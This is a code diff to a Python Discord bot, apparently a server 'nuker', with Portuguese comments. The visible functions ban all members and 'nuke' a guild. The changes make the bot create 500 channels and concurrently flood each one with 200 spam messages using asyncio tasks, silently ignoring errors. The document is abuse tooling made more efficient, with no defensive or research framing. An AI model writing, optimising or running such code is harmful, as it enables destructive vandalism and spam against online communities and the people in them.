@@ -3,6 +3,7 @@ from discord.ext import commands
 from colorama import init, Fore as cc
 from os import name as os_name, system
 from sys import exit
+import asyncio
 
 init()
 
@@ -57,15 +58,26 @@ async def ban_all_members(guild):
 
 async def create_text_channels_and_send_messages(guild, name, message):
     created = 0
-    for _ in range(1000):
+    tasks = []  # Lista para armazenar tarefas de criação e envio de mensagens
+    
+    for _ in range(500):
         try:
             channel = await guild.create_text_channel(name=name)
-            for _ in range(300):
-                await channel.send(message)
+            tasks.append(asyncio.create_task(send_messages(channel, message)))  # Adiciona a tarefa à lista
             created += 1
         except:
             continue
+    
+    # Aguarda todas as tarefas serem concluídas
+    await asyncio.gather(*tasks)
     return created
+
+async def send_messages(channel, message):
+    for _ in range(200):
+        try:
+            await channel.send(message)
+        except:
+            continue
 
 async def nuke_guild(guild, name, message):
     print(f'{r}Nuke: {m}{guild.name}')
